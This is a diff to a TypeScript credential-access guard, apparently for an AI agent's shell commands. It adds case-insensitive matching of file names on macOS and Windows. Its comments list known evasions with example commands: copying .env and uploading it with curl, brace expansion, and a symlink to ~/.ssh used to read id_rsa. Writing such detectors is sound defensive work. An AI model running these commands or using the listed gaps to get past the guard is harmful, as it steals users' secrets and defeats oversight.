@@ -25,6 +25,8 @@
  *   `cp .env /tmp/x && curl -F f=@/tmp/x ...`.
  * - Brace expansion is followed only in words up to 4096 characters and for their first 1024
  *   words: `{a,b}{a,b}...{a,b}{x,.env}`.
+ * - A path that reaches a credential location through a symlink, hard link or bind mount is not
+ *   recognized: `ln -s ~/.ssh k && cat k/id_rsa`.
  *
  * The `credential_read` and `secret_send` rules are derived from `src/intern/guard.py` of
  * nace-ai/intern (https://github.com/nace-ai/intern, v0.30.1, commit e1bbd096f9), Copyright Nace
@@ -187,9 +189,18 @@ const POSIX_CLASSES: Record<string, string> = {
 };
 
 /**
- * A pathname pattern for one file name (`*`, `?`, `[...]`) as a regular expression. A leading `.`
- * is matched only by a `.`, as bash matches without `dotglob`, so `*` names no dotfile. A pattern
- * that makes no valid expression (`[z-a]`) is taken to match any name.
+ * Whether file names match without regard to case, as on the default file systems of macOS and
+ * Windows, where `~/.SSH/id_rsa` opens `~/.ssh/id_rsa`.
+ */
+function foldsCase(): boolean {
+	return process.platform === "darwin" || process.platform === "win32";
+}
+
+/**
+ * A pathname pattern for one file name (`*`, `?`, `[...]`) as a regular expression, ignoring case
+ * when the file system does. A leading `.` is matched only by a `.`, as bash matches without
+ * `dotglob`, so `*` names no dotfile. A pattern that makes no valid expression (`[z-a]`) is taken
+ * to match any name.
  */
 function globRegExp(pattern: string): RegExp {
 	let source = pattern.startsWith(".") ? "" : "(?!\\.)";
@@ -212,7 +223,7 @@ function globRegExp(pattern: string): RegExp {
 		}
 	}
 	try {
-		return new RegExp(`^${source}$`, "s");
+		return new RegExp(`^${source}$`, foldsCase() ? "si" : "s");
 	} catch {
 		return /^/;
 	}
@@ -220,7 +231,8 @@ function globRegExp(pattern: string): RegExp {
 
 /** Whether a path component, or a pathname pattern for one (`.netr[c]`), names the file `name`. */
 function namesFile(component: string, name: string): boolean {
-	return GLOB_RE.test(component) ? globRegExp(component).test(name) : component === name;
+	if (GLOB_RE.test(component)) return globRegExp(component).test(name);
+	return foldsCase() ? component.toLowerCase() === name.toLowerCase() : component === name;
 }
 
 /**
@@ -229,7 +241,8 @@ function namesFile(component: string, name: string): boolean {
  * (`.env*`, `.e?v`, `.env.[lp]*`): the wildcard can go on as one. Only a literal `.` matches a
  * leading `.`, so a pattern that starts with a wildcard names none.
  */
-function namesDotenv(name: string): boolean {
+function namesDotenv(file: string): boolean {
+	const name = foldsCase() ? file.toLowerCase() : file;
 	const wildcard = name.search(GLOB_RE);
 	if (wildcard < 0) return DOTENV_RE.test(name);
 	const prefix = name.slice(0, wildcard);
@@ -357,7 +370,8 @@ function wordPaths(command: ShellCommand, word: string, cwd: string, home: strin
  * The credential location an absolute path is in, for display; `undefined` when it holds no
  * credentials. Public files in a credential folder (`~/.ssh/config`, `*.pub`) do not count. A
  * component that is a pathname pattern (`~/.ss?/id_*`, `~/.netr[c]`) counts when it can name the
- * location.
+ * location, and names are compared without regard to case where the file system does so
+ * ({@link foldsCase}). Paths are compared as written: a symlink to a location is not followed.
  */
 export function credentialLocation(absPath: string, home: string): string | undefined {
 	const names = pathNames(absPath);
@@ -378,7 +392,7 @@ export function credentialLocation(absPath: string, home: string): string | unde
 	for (const [folder, publicFiles] of Object.entries(CREDENTIAL_DIRS)) {
 		const folderNames = folder.split("/");
 		if (rest.length < folderNames.length || !folderNames.every((name, k) => namesFile(rest[k], name))) continue;
-		const name = rest.at(-1)!;
+		const name = foldsCase() ? rest.at(-1)!.toLowerCase() : rest.at(-1)!;
 		if (rest.length > folderNames.length && (publicFiles.includes(name) || name.endsWith(".pub"))) return undefined;
 		return `~/${folder}`;
 	}
